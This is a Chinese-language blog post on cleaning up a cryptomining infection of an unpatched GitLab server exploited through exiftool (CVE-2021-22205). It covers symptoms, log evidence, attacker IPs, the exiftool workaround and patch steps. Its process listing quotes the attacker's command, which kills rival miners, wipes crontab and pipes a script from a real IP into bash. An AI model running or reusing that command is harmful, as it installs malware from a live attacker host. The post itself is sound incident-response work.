---
layout: post
title:  "gitlab中挖矿病毒应对"
author: "周海汉"
date:   2021-11-12 15:28:36 +0800
categories: tech
tags:
    - gitlab
    - 挖矿
    - 病毒
    - ldr.sh
    - pkill
    - mining
    - crypto
    - blockchain
---

# gitlab中挖矿病毒应对

# 概述
旧版gitlab可能中挖矿病毒

表现为
- CPU超高
- 大量的pkill进程
- gitlab时而可用时而不可用，经常502
- 日志exitool

# 具体表现
## cpu超高
```

  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND
  368 git       20   0 2752356 2.290g   4380 S 146.8 29.4  37:35.80 kthzabor
  943 git       20   0 1097568 558192  20912 S   1.3  6.8   3:10.94 bundle

 ```

其中kthzabor 被感染。CPU达到100%以上。

## 大量pkill进程
```
root@i-fph8oxp3:~# ps -ef |grep pkill
git      10913 32537  0 14:14 ?        00:00:00 /bin/bash -c pkill -9 kdevtmpfsi | pkill -9 dbused | pkill -9 kinsing | crontab -r | curl 42.112.28.216/ldr.sh | bash
git      13814  2656  0 14:15 ?        00:00:00 /bin/bash -c pkill -9 kdevtmpfsi | pkill -9 dbused | pkill -9 kinsing | crontab -r | curl 42.112.28.216/ldr.sh | bash
git      13821 32513  0 14:15 ?        00:00:00 /bin/bash -c pkill -9 kdevtmpfsi | pkill -9 dbused | pkill -9 kinsing | crontab -r | curl 42.112.28.216/ldr.sh | bash

```
可以看到下载42.112.28.216/ldr.sh 脚本。
该IP地址在越南河内。

## 日志

### 运行日志有exiftool

`/var/log/gitlab/gitlab-workhorse/current`文件可以查到exiftool命令失败
```json
{"correlation_id":"eeP6E3wRUK9","filename":"test.jpg","level":"info","msg":"running exiftool to remove any metadata","time":"2021-11-11T14:07:55+08:00"}
{"command":["exiftool","-all=","--IPTC:all","--XMP-iptcExt:all","-tagsFromFile","@","-ResolutionUnit","-XResolution","-YResolution","-YCbCrSubSampling","-YCbCrPositioning","-BitsPerSample","-ImageHeight","-ImageWidth","-ImageSize","-Copyright","-CopyrightNotice","-Orientation","-"],"correlation_id":"eeP6E3wRUK9","error":"exit status 1","level":"info","msg":"exiftool command failed","stderr":""
```
### nginx访问日志
`/var/log/gitlab/nginx/gitlab_access.log`
查到攻击者IP `51.89.237.81`,`165.227.239.108`,都在英国
```
51.89.237.81 - - [12/Nov/2021:13:20:49 +0800] "GET /users/sign_in HTTP/1.0" 200 12708 "" "python-requests/2.26.0"
51.89.237.81 - - [12/Nov/2021:13:20:58 +0800] "POST /uploads/user HTTP/1.0" 422 24 "" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
165.227.239.108 - - [12/Nov/2021:13:26:59 +0800] "GET /users/sign_in HTTP/1.0" 200 12708 "" "python-requests/2.24.0"

```
### 登录日志
产品日志和授权日志可能有创建的账号
`/var/log/gitlab/gitlab-rails/production_json.log`，`/var/log/gitlab/gitlab-rails/auth.log`

# 修补办法
## 修改安全防范措施
- 修改ssh端口
- 防火墙禁止ssh非许可IP登录。
- 堡垒机
- 白名单

## 杀死病毒进程

## 更新gitlab
gilab新版已经有了补丁
不能直接在线升级，否则病毒也会在里面。

### 修改exiftool
将文件替换为`/opt/gitlab/embedded/bin/exiftool`
```
#!/bin/bash

cat -
```
运行` chmod a+x exiftool`

持续升级并做上面的事情，直到13.10.3+。

## 升级

用下面的命令：
```
sudo su
cd ~
curl -JLO https://gitlab.com/gitlab-org/build/CNG/-/raw/master/gitlab-ruby/patches/allow-only-tiff-jpeg-exif-strip.patch
cd /opt/gitlab/embedded/lib/exiftool-perl
patch -p2 < ~/allow-only-tiff-jpeg-exif-strip.patch
```
如果 patch 失败，可以根据失败日志手动修改文件。

# 参考
- https://forum.gitlab.com/t/cve-2021-22205-how-to-determine-if-a-self-managed-instance-has-been-impacted/60918

- https://www.freebuf.com/articles/system/282954.html
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22205
